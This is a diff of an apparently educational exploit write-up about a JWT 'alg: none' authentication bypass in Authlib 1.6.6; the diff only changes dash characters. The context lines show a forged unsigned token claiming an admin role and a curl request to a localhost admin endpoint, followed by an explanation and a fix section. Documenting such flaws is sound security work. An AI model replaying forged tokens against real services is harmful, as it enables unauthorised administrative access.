@@ -10,7 +10,7 @@ Authlib 1.6.6 does not reject tokens where `alg` is `none`. The library decodes 
 
 ## Exploit Steps
 
-### 1 — Build the forged token manually
+### 1 - Build the forged token manually
 
 A JWT is three Base64URL-encoded parts separated by dots. With `alg: none`, the third part (signature) is empty but the trailing dot is required.
 
@@ -31,7 +31,7 @@ Resulting token:
 eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJuYW1lIjoiaGFja2VyIiwicm9sZSI6ImFkbWluIn0.
 ```
 
-### 2 — Call the admin endpoint
+### 2 - Call the admin endpoint
 
 ```bash
 curl http://localhost:3000/api/admin/data \
@@ -51,7 +51,7 @@ Response:
 
 - The JWT header is fully attacker-controlled.
 - Authlib 1.6.6 does not enforce an algorithm allowlist on `decode()`.
-- A `none` token has no signature to forge — the server accepts any claims.
+- A `none` token has no signature to forge - the server accepts any claims.
 - Authorization is decided entirely by `claims["role"]` after decode.
 
 ## Fix
